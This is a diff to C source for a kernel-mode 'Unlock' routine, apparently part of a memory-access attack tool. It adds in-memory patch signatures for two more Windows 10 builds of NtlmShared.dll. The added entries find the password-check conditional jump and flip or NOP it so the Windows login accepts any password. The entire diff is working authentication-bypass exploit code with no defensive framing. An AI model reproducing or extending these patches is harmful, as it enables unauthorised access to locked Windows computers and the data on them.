@@ -129,7 +129,7 @@ NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages
 	return E_FAIL;
 }
 
-#define NUMBER_OF_SIGNATURES 13
+#define NUMBER_OF_SIGNATURES 15
 NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 {
 	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
@@ -169,6 +169,12 @@ NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 			{ .cbOffset = 0x6e8,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
 			{ .cbOffset = 0x6e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
+		// Windows 10 x64 [NtlmShared.dll (2019-02-06)/10.0.14393.2791]
+		{.chunk = {
+			{.cbOffset = 0x6f5,.cb = 6,.pb = { 0x49, 0x3B, 0xC6, 0x0F, 0x85, 0x18 } },
+			{.cbOffset = 0x6fb,.cb = 5,.pb = { 0x0FB, 0xFF, 0xFF, 0xB8, 0x01 } },
+			{.cbOffset = 0x6f9,.cb = 1,.pb = { 0x84 } } }
+		},
 		// Windows 10 x64 [NtlmShared.dll (2017-03-18)/10.0.15063.0]
 		{ .chunk = {
 			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xc5, 0x1c } },
@@ -193,6 +199,12 @@ NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
             { .cbOffset = 0x69e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
             { .cbOffset = 0x69e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
         },
+		// Windows 10 x64 [NtlmShared.dll (2019-10-02)/10.0.17134.1067]
+		{.chunk = {
+			{.cbOffset = 0x6ab,.cb = 6,.pb = { 0x49, 0x3B, 0xC6, 0x0F, 0x85, 0x2E } },
+			{.cbOffset = 0x6b1,.cb = 5,.pb = { 0xFB, 0xFF, 0xFF, 0xB0, 0x01 } },
+			{.cbOffset = 0x6af,.cb = 1,.pb = { 0x84 } } }
+		},
 		// Windows 10 x64 [NtlmShared.dll (2018-09-15)/10.0.17763.1]
 		{.chunk = {
 			{.cbOffset = 0x740,.cb = 4,.pb = { 0xff, 0x15, 0xb2, 0x1b } },
